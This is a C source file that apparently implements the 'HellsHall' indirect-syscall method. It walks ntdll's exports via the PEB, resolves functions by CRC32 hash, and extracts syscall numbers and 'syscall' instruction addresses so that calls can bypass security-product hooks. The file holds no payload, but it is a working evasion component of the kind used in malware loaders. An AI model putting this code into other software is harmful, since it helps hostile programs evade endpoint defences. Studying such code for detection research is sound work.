#include <Windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"


#define SEED        0xEDB88320
#define RANGE       0x1E


typedef struct _NTDLL {

    PBYTE                       pNtdll;
    PIMAGE_DOS_HEADER           pImgDos;
    PIMAGE_NT_HEADERS           pImgNtHdrs;
    PIMAGE_EXPORT_DIRECTORY     pImgExpDir;
    PDWORD                      pdwArrayOfFunctions;
    PDWORD                      pdwArrayOfNames;
    PWORD                       pwArrayOfOrdinals;

}NTDLL, *PNTDLL;


NTDLL       NtdllSt     = { 0 };
SysFunc     sF          = { 0 };





// Source: https://stackoverflow.com/a/21001712

uint32_t crc32b(const uint8_t* str) {

    uint32_t    byte    = 0x0,
                mask    = 0x0,
                crc     = 0xFFFFFFFF;
    int         i       = 0x0,
                j       = 0x0;

    while (str[i] != 0) {
        byte    = str[i];
        crc     = crc ^ byte;

        for (j = 7; j >= 0; j--) {
            mask    = -1 * (crc & 1);
            crc     = (crc >> 1) ^ (SEED & mask);
        }

        i++;
    }
    return ~crc;
}


// USED TO CUT TIME
BOOL InitilizeNtdllConfig() {

    //  CHECK
    if (NtdllSt.pdwArrayOfFunctions != NULL && NtdllSt.pdwArrayOfNames != NULL && NtdllSt.pwArrayOfOrdinals != NULL)
        return TRUE;


    PPEB                    pPeb            = NULL;
    PLDR_DATA_TABLE_ENTRY   pDte            = NULL;
    PBYTE                   uNtdll          = NULL;

    RtlSecureZeroMemory(&NtdllSt, sizeof(NTDLL));

    //  PEB
    pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb == NULL || pPeb->OSMajorVersion != 0xA)
        return FALSE;

    //  NTDLL
    pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
    if (!pDte)
        return FALSE;

    NtdllSt.pNtdll = uNtdll = pDte->DllBase;

    //  DOS
    NtdllSt.pImgDos = (PIMAGE_DOS_HEADER)uNtdll;
    if (NtdllSt.pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    //  NT
    NtdllSt.pImgNtHdrs = (PIMAGE_NT_HEADERS)(uNtdll + NtdllSt.pImgDos->e_lfanew);
    if (NtdllSt.pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    //  EXPORT
    NtdllSt.pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uNtdll + NtdllSt.pImgNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress);
    if (!NtdllSt.pImgExpDir || !NtdllSt.pImgExpDir->Base)
        return NULL;

    //  ARRAYS
    NtdllSt.pdwArrayOfFunctions = (PDWORD)(uNtdll + NtdllSt.pImgExpDir->AddressOfFunctions);
    NtdllSt.pdwArrayOfNames     = (PDWORD)(uNtdll + NtdllSt.pImgExpDir->AddressOfNames);
    NtdllSt.pwArrayOfOrdinals   = (PWORD)(uNtdll + NtdllSt.pImgExpDir->AddressOfNameOrdinals);

    //  CHECK
    if (!NtdllSt.pdwArrayOfFunctions || !NtdllSt.pdwArrayOfNames || !NtdllSt.pwArrayOfOrdinals)
        return FALSE;

    return TRUE;
}





/*
Fill Up The Global `SysFunc sF` structure;
    `uSysFuncHash` is a hash value of the syscall 

*/
BOOL InitilizeSysFunc (IN UINT32_T uSysFuncHash) {

    if (!uSysFuncHash)
        return FALSE;

    if (!NtdllSt.pNtdll && !InitilizeNtdllConfig())
        return FALSE;


    for (DWORD i = 0; i < NtdllSt.pImgExpDir->NumberOfFunctions; i++){
        
        CHAR* cFuncName = (CHAR*) (NtdllSt.pdwArrayOfNames[i] + NtdllSt.pNtdll);

        if (HASH(cFuncName) == uSysFuncHash) {


            sF.uHash    = uSysFuncHash;
            sF.pAddress = (PVOID)(NtdllSt.pdwArrayOfFunctions[NtdllSt.pwArrayOfOrdinals[i]] + NtdllSt.pNtdll);
            
            DWORD   j   = 0;

            while (TRUE){

                //  WE REACHED `ret` INSTRUCTION - THAT IS TOO FAR DOWN
                if (*((PBYTE)sF.pAddress + j) == 0xC3 && !sF.pInst)
                    return FALSE;

                //  SEARCHING FOR 
                //      MOV R10, RCX
                //      MOV RCX, <SSN>
                if (*((PBYTE)sF.pAddress + j + 0x00) == 0x4C &&
                    *((PBYTE)sF.pAddress + j + 0x01) == 0x8B &&
                    *((PBYTE)sF.pAddress + j + 0x02) == 0xD1 &&
                    *((PBYTE)sF.pAddress + j + 0x03) == 0xB8 ){
                
                    BYTE    low    = *((PBYTE)sF.pAddress + j + 0x04);
                    BYTE    high   = *((PBYTE)sF.pAddress + j + 0x05);
  
                    // GETTING THE SSN
                    sF.wSSN        = (high << 0x08) | low;

                    // GETTING THE ADDRESS OF THE `syscall` INSTRUCTION, SO THAT WE CAN JUMP TO LATER
                    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++){
                        if (*((PBYTE)sF.pAddress + j + z) == 0x0F && *((PBYTE)sF.pAddress + j + x) == 0x05) {
                            sF.pInst = (sF.pAddress + j + z);
                            break;
                        }
                    }


                    if (sF.wSSN && sF.pInst)
                        return TRUE;
                    else
                        return FALSE;
                }

                // HOOKED
                j++;
            
            }

        }

    }

    return FALSE;

}




/*
    copy the data from the global `SysFunc sF` structure to the input `psF`
*/
VOID getSysFuncStruct(OUT PSysFunc psF) {

    psF->pAddress   = sF.pAddress;
    psF->pInst      = sF.pInst;
    psF->uHash      = sF.uHash;
    psF->wSSN       = sF.wSSN;
}
